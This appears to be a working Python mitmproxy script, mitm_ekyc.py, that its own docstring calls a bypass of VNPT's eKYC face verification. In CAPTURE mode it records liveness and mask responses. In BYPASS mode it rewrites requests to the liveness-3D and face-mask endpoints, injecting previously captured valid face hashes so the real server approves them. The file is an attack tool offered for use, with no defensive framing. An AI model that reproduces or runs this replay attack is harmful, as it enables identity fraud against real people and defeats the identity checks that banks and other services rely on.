"""
mitm_ekyc.py - MITM Proxy for VNPT eKYC bypass
WORKFLOW:
  1. Set MODE="CAPTURE", do a real face scan → captures valid hashes
  2. Set MODE="BYPASS" → intercepts request, injects valid hashes, lets real server sign it

CHANGE MODE HERE:
"""
MODE = "BYPASS"   # "CAPTURE" or "BYPASS"

from mitmproxy import http
import json, os

LIVENESS_FILE    = 'capture_liveness_resp.json'
MASK_FILE        = 'capture_mask_resp.json'

VALID_NEAR_HASH = "zone4/idg20260708-0ced7972-9864-4a32-e063-62199f0ad57f/IDG01_a4fd5ce0-7a86-11f1-8182-fd7dbf4502cd"
VALID_FAR_HASH  = "zone2/idg20260708-0ced7972-9864-4a32-e063-62199f0ad57f/IDG01_a51662cf-7a86-11f1-af90-5fbeee1966b6"

class eKYCBypass:
    def request(self, flow: http.HTTPFlow):
        url = flow.request.pretty_url
        if any(x in url for x in ['vnpt', 'idg.vnpt']):
            method = flow.request.method
            print(f"[MITM] >> {method} {url[:100]}")

        if MODE == "BYPASS":
            # Inject valid face hashes into Liveness request
            if "api.idg.vnpt.vn/ai/v4/face/liveness-3d" in url:
                try:
                    body = json.loads(flow.request.text)
                    print(f"\\n[MITM] *** Intercepted Liveness-3D Request! Injecting valid hashes...")
                    body["near_img"] = VALID_NEAR_HASH
                    body["far_img"]  = VALID_FAR_HASH
                    if "scan3d" in body:
                        body["scan3d"] = VALID_FAR_HASH
                    flow.request.set_text(json.dumps(body))
                except Exception as e:
                    print(f"[MITM] Liveness inject error: {e}")

            # Inject valid face hashes into Mask request
            elif "api.idg.vnpt.vn/ai/v4/face/mask" in url:
                try:
                    body = json.loads(flow.request.text)
                    print(f"\\n[MITM] *** Intercepted Mask Request! Injecting valid hash...")
                    if "imgs" in body and isinstance(body["imgs"], dict):
                        body["imgs"]["img"] = VALID_FAR_HASH
                    flow.request.set_text(json.dumps(body))
                except Exception as e:
                    print(f"[MITM] Mask inject error: {e}")

    def response(self, flow: http.HTTPFlow):
        url = flow.request.pretty_url
        if MODE == "CAPTURE":
            if "api.idg.vnpt.vn/ai/v4/face/liveness-3d" in url:
                try:
                    body = json.loads(flow.response.text)
                    open(LIVENESS_FILE, 'w', encoding='utf-8').write(flow.response.text)
                    print(f"\\n[MITM] >>> CAPTURED Liveness-3D: {body.get('object', {}).get('liveness', '?')}")
                except: pass
            elif "api.idg.vnpt.vn/ai/v4/face/mask" in url:
                try:
                    body = json.loads(flow.response.text)
                    open(MASK_FILE, 'w', encoding='utf-8').write(flow.response.text)
                    print(f"\\n[MITM] >>> CAPTURED Face Mask: {body.get('object', {}).get('masked', '?')}")
                except: pass

addons = [eKYCBypass()]
